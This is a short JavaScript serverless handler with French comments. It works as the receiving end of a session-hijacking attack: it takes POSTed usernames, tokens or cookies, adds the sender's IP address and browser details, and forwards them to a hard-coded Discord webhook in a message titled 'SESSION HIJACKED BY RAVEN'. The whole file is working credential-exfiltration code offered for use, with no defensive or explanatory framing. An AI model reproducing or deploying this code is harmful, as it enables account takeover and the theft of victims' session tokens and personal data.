export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Forbidden');

    const data = req.body;
    const userAgent = req.headers['user-agent'];
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // WEBHOOK DISCORD (Le flux réel)
    const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";

    const payload = {
        embeds: [{
            title: "🏴‍☠️ SESSION HIJACKED BY RAVEN",
            color: 0x00ff41,
            fields: [
                { name: "👤 Cible", value: data.username || "Inconnu", inline: true },
                { name: "🌐 IP Addr", value: `||${ip}||`, inline: true },
                { name: "📂 Type", value: data.type, inline: false },
                { name: "🔑 Token/Cookie", value: `\`\`\`${data.token}\`\`\`` },
                { name: "📱 OS/Browser", value: userAgent.substring(0, 100) }
            ],
            timestamp: new Date()
        }]
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    return res.status(200).json({ status: "captured" });
}
